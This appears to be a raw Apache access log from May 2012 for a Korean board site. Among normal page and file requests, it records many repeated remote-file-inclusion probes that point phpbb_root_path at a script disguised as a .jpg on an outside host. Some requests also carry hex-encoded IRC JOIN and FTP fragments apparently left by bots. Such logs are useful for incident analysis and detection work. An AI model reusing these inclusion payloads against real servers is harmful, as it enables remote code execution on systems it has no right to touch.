127.0.0.1 - - [03/May/2012:00:56:02 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:00:56:06 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2479 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:00:56:24 +0900] "GET /rg4_board/slide.php?bbs_code=open_7&bd_num=3565 HTTP/1.0" 404 311
127.0.0.1 - - [03/May/2012:00:56:30 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:56:38 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:56:44 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:56:58 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:57:00 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:57:06 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:00:57:13 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2481 HTTP/1.0" 200 206
127.0.0.1 - - [03/May/2012:00:57:45 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:57:52 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:57:58 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:00:58:12 +0900] "GET /rg4_board/view.php?&bbs_code=class_noti&ss%5Bcat%5D=&bd_num=3631 HTTP/1.0" 200 17947
124.2.44.105 - - [03/May/2012:00:58:20 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2482 HTTP/1.0" 200 206
127.0.0.1 - - [03/May/2012:00:58:48 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:59:00 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:59:06 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
61.247.204.36 - - [03/May/2012:00:59:06 +0900] "GET %4a%4f%49%4e%20%23%23%6e%65%74%23%23%0d%0a/rg4_board/list.php?bbs_code=open_6&p=5 HTTP/1.1" 200 22429
127.0.0.1 - - [03/May/2012:00:59:11 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:59:13 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:59:15 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:59:49 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:59:51 +0900] "GET / HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:00:03 +0900] "GET / HTTP/1.1" 200 1456
61.247.204.36 - - [03/May/2012:01:00:24 +0900] "GET /rg4_board/view.php?bbs_code=action&bd_num=1500&page=3 HTTP/1.1" 200 65955
127.0.0.1 - - [03/May/2012:01:00:36 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:00:39 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:00:41 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:01:11 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:01:13 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:01:15 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:01:17 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:01:21 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:01:23 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:01:01:26 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2483 HTTP/1.0" 200 206
61.247.204.37 - - [03/May/2012:01:01:37 +0900] "GET /rg4_board/list.php?bbs_code=open_6&p=6 HTTP/1.1" 200 22429
124.2.44.105 - - [03/May/2012:01:01:41 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2485 HTTP/1.0" 200 206
127.0.0.1 - - [03/May/2012:01:01:52 +0900] "GET /?name=Rules//modules/Forums/admin/admin_words.php%3fphpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:01:56 +0900] "GET /?name=Rules//modules/Forums/admin/admin_words.php%3fphpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:01:58 +0900] "GET /?name=Rules//modules/Forums/admin/admin_words.php%3fphpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:01:01:54 +0900] "GET /rg4_board/view.php?&bbs_code=class_noti&ss%5Bcat%5D=&page=1&bd_num=3512 HTTP/1.0" 200 17502
124.2.44.105 - - [03/May/2012:01:02:03 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2487 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:01:02:35 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2488 HTTP/1.0" 200 206
127.0.0.1 - - [03/May/2012:01:03:03 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:03:05 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:03:06 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
61.247.204.35 - - [03/May/2012:01:03:32 +0900] "GET /rg4_data/board/02068_390_0.file HTTP/1.1" 200 102271
61.247.204.39 - - [03/May/2012:01:04:24 +0900] "GET /rg4_board/view.php?bbs_code=open_4&bd_num=1701&page=2 HTTP/1.1" 200 27167
124.2.44.105 - - [03/May/2012:01:04:33 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2489 HTTP/1.0" 200 206
127.0.0.1 - - [03/May/2012:01:07:03 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:07:08 +0900] "GET / HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:07:14 +0900] "GET / HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:09:50 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:09:56 +0900] "GET / HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:10:02 +0900] "GET / HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:01:10:30 +0900] "GET %4a%4f%49%4e%20%23%21%21%6e%7a%6d%21%21%20%0d%0a/rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2490 HTTP/1.0" 200 206
127.0.0.1 - - [03/May/2012:01:10:42 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:10:44 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:10:50 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:01:11:06 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2491 HTTP/1.0" 200 206
127.0.0.1 - - [03/May/2012:01:11:52 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:11:54 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:11:57 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:12:03 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:01:13:28 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2492 HTTP/1.0" 200 206
211.39.150.195 - - [03/May/2012:01:13:40 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&ss%5Bcat%5D=&page=17&bd_num=1798 HTTP/1.1" 200 215
127.0.0.1 - - [03/May/2012:01:13:52 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:13:55 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:13:58 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:14:02 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:14:04 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:14:06 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:14:21 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:14:23 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:14:46 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:14:49 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:14:54 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:16:11 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:16:12 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:16:14 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:01:17:26 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2493 HTTP/1.0" 200 206
127.0.0.1 - - [03/May/2012:01:17:34 +0900] "GET /?name=News&amp%3bfile=article&amp%3bsid=10&amp%3bmode=&amp%3border=0&amp%3bthold=0//modules/Forums/admin/admin_words.php%3fphpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
61.247.204.36 - - [03/May/2012:01:17:33 +0900] "GET /rg4_data/board/00108_897_0.file HTTP/1.1" 200 2200856
127.0.0.1 - - [03/May/2012:01:17:41 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:17:59 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:01:18:04 +0900] "GET /rg4_board/mail_content.php?bbs_code=open_7&bd_num=3671 HTTP/1.0" 404 318
61.247.204.37 - - [03/May/2012:01:18:56 +0900] "GET /rg4_data/board/02991_969_0.file HTTP/1.1" 200 1832092
124.2.44.105 - - [03/May/2012:01:19:01 +0900] "GET /rg4_board/slide.php?bbs_code=open_7&bd_num=3531 HTTP/1.0" 404 311
61.247.204.38 - - [03/May/2012:01:19:07 +0900] "GET /rg4_data/board/02956_457_0.file HTTP/1.1" 200 1765109
61.247.204.38 - - [03/May/2012:01:19:17 +0900] "GET /rg4_board/down.php?bbs_code=open_5&bd_num=707&key=0&mode=down HTTP/1.1" 200 672768
127.0.0.1 - - [03/May/2012:01:20:03 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:20:04 +0900] "GET / HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:20:10 +0900] "GET / HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:20:12 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:20:14 +0900] "GET / HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:20:16 +0900] "GET / HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:20:45 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:20:48 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:20:50 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:20:53 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:20:55 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:20:56 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:20:56 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:21:02 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:21:08 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:21:10 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:21:11 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:21:12 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
61.247.204.36 - - [03/May/2012:01:21:25 +0900] "GET /rg4_board/view.php?bbs_code=action&bd_num=1301&page=4 HTTP/1.1" 200 66091
61.247.204.35 - - [03/May/2012:01:21:35 +0900] "GET %32%32%30%20%4e%7a%6d%78%46%74%70%64%20%30%77%6e%73%20%6a%30%0a/rg4_board/view.php?bbs_code=action&bd_num=1299&page=4 HTTP/1.1" 200 66090
61.247.204.37 - - [03/May/2012:01:21:49 +0900] "GET %4a%4f%49%4e%20%23%47%78%78%20%2e%47%78%78%2e%0d%0a/rg4_board/view.php?bbs_code=action&bd_num=1494&page=3 HTTP/1.1" 200 65955
61.247.204.35 - - [03/May/2012:01:22:00 +0900] "GET /rg4_board/view.php?bbs_code=action&bd_num=945&page=5 HTTP/1.1" 200 66057
127.0.0.1 - - [03/May/2012:01:22:06 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
61.247.204.39 - - [03/May/2012:01:22:31 +0900] "GET /rg4_data/board/01608_881_0.file HTTP/1.1" 200 1699940
127.0.0.1 - - [03/May/2012:01:22:46 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:22:51 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:22:53 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:22:54 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:22:56 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:22:58 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
61.247.204.35 - - [03/May/2012:01:23:41 +0900] "GET /rg4_board/view.php?bbs_code=praise&bd_num=3096&page=2 HTTP/1.1" 200 26261
124.2.44.105 - - [03/May/2012:01:23:47 +0900] "GET /rg4_board/view.php?bbs_code=gifted_5&bd_num=3491 HTTP/1.0" 200 64950
124.2.44.105 - - [03/May/2012:01:23:58 +0900] "GET /rg4_board/down.php?bbs_code=open_1&bd_num=3499&key=0&mode=down HTTP/1.0" 200 770048
124.2.44.105 - - [03/May/2012:01:24:04 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2495 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:01:24:15 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2496 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:01:24:26 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26 HTTP/1.0" 200 206
61.247.204.38 - - [03/May/2012:01:24:26 +0900] "GET /rg4_board/view.php?bbs_code=praise&bd_num=3082&page=2 HTTP/1.1" 200 26190
127.0.0.1 - - [03/May/2012:01:24:35 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:24:37 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:24:39 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
61.247.204.36 - - [03/May/2012:01:24:59 +0900] "GET /rg4_board/view.php?bbs_code=gifted_3&bd_num=1876&page=2 HTTP/1.1" 200 24249
124.2.44.105 - - [03/May/2012:01:25:00 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2497 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:01:25:17 +0900] "GET /rg4_board/view.php?bbs_code=open_1&bd_num=1026&page=7 HTTP/1.0" 200 28054
61.247.204.37 - - [03/May/2012:01:25:26 +0900] "GET /rg4_data/board/01297_944_0.file HTTP/1.1" 200 1738089
124.2.44.105 - - [03/May/2012:01:25:37 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2532 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:01:26:00 +0900] "GET /rg4_board/mail_content.php?bbs_code=open_7&bd_num=3665 HTTP/1.0" 404 318
127.0.0.1 - - [03/May/2012:01:26:51 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:01:26:51 +0900] "GET /rg4_board/view.php?bbs_code=open_1&bd_num=1186&page=7 HTTP/1.0" 200 27503
127.0.0.1 - - [03/May/2012:01:26:53 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:26:54 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:27:02 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:01:26:59 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2585 HTTP/1.0" 200 206
127.0.0.1 - - [03/May/2012:01:27:04 +0900] "GET / HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:27:07 +0900] "GET / HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:01:27:12 +0900] "GET /rg4_board/print.php?bbs_code=open_7&bd_num=3664 HTTP/1.0" 404 311
124.2.44.105 - - [03/May/2012:01:27:29 +0900] "GET /rg4_board/view.php?bbs_code=gifted_3&bd_num=2084 HTTP/1.0" 200 25974
127.0.0.1 - - [03/May/2012:01:27:52 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:27:56 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
61.247.204.39 - - [03/May/2012:01:28:18 +0900] "GET /rg4_board/view.php?bbs_code=praise&bd_num=2981&page=3 HTTP/1.1" 200 25972
61.247.204.36 - - [03/May/2012:01:28:28 +0900] "GET /rg4_board/slide.php?bbs_code=action&bd_num=2911 HTTP/1.1" 404 311
124.2.44.105 - - [03/May/2012:01:28:29 +0900] "GET /rg4_board/slide.php?bbs_code=open_7&bd_num=3674 HTTP/1.0" 404 311
127.0.0.1 - - [03/May/2012:01:28:33 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:28:35 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:28:36 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
61.247.204.39 - - [03/May/2012:01:28:48 +0900] "GET /rg4_board/slide.php?bbs_code=action&bd_num=2912 HTTP/1.1" 404 311
61.247.204.38 - - [03/May/2012:01:29:13 +0900] "GET /rg4_board/down.php?bbs_code=open_4&bd_num=3134&key=0&mode=down HTTP/1.1" 200 88576
127.0.0.1 - - [03/May/2012:01:29:29 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:29:40 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:29:42 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:30:17 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:01:30:18 +0900] "GET /rg4_board/view.php?bbs_code=open_1&bd_num=1547&page=5 HTTP/1.0" 200 28194
127.0.0.1 - - [03/May/2012:01:30:20 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
61.247.204.38 - - [03/May/2012:01:30:19 +0900] "GET /rg4_board/view.php?bbs_code=praise&bd_num=1220&page=4 HTTP/1.1" 200 26019
127.0.0.1 - - [03/May/2012:01:30:21 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:30:22 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:30:29 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:30:37 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:01:31:00 +0900] "GET /rg4_board/view.php?bbs_code=open_1&bd_num=1619&page=5 HTTP/1.0" 200 27668
124.2.44.105 - - [03/May/2012:01:31:04 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2589 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:01:31:35 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2590 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:01:32:11 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2591 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:01:32:25 +0900] "GET /rg4_board/view.php?bbs_code=association&bd_num=3705 HTTP/1.0" 200 22350
124.2.44.105 - - [03/May/2012:01:32:41 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2592 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:01:32:59 +0900] "GET /rg4_board/down.php?&bbs_code=class_free&page=6&bd_num=3026&key=0&mode=down HTTP/1.0" 200 205
124.2.44.105 - - [03/May/2012:01:33:29 +0900] "GET %66%74%70%20%2d%6e%20%2d%73%3a/rg4_board/view.php?bbs_code=gifted_5&bd_num=3484 HTTP/1.0" 200 65620
124.2.44.105 - - [03/May/2012:01:33:56 +0900] "GET %20%3a%02%6e%02%7a%1f%6d%1f%20%28/rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2593 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:01:34:03 +0900] "GET %4a%4f%49%4e%20%23%77%20%73%0d%0a/rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2594 HTTP/1.0" 200 206
127.0.0.1 - - [03/May/2012:01:34:27 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:34:28 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:01:34:28 +0900] "GET /rg4_board/view.php?bbs_code=open_1&bd_num=2199&page=4 HTTP/1.0" 200 28064
127.0.0.1 - - [03/May/2012:01:34:56 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:34:58 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:35:00 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:35:08 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:35:10 +0900] "GET / HTTP/1.1" 200 1456
